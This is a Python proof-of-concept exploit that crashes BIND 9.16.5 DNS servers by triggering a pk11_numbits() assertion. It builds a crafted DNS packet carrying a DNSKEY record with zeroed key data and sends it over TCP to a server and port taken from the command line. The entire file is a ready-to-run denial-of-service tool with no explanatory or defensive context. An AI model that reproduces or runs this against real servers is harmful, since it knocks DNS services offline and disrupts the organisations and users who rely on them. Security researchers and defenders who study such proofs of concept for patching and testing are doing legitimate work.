#!/usr/bin/env python3
"""
BIND 9.16.5 remote DoS
pk11_numbits() assertion
"""
import sys
import socket

pkt = b"\x01\x37\xed\xda\x28\x00\x00\x01\x00\x00\x00\x01\x00\x00\x09\x72" \
    + b"\x73\x61\x73\x68\x61\x32\x35\x36\x07\x65\x78\x61\x6d\x70\x6c\x65" \
    + b"\x00\x00\x06\x00\x01" \
    + b"\xc0\x0c\x00\x30\x00\x01\x00\x00\x01\x2c\x01" \
    + b"\x08\x01\x00\x03\x08\x03\x01\x00\x01" \
    + b'\x00'*256

if len(sys.argv) < 3:
    print('usage: %s server port' % sys.argv[0])
    sys.exit()

IP = sys.argv[1]
PORT = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))
sock.sendall(pkt)
sock.close()
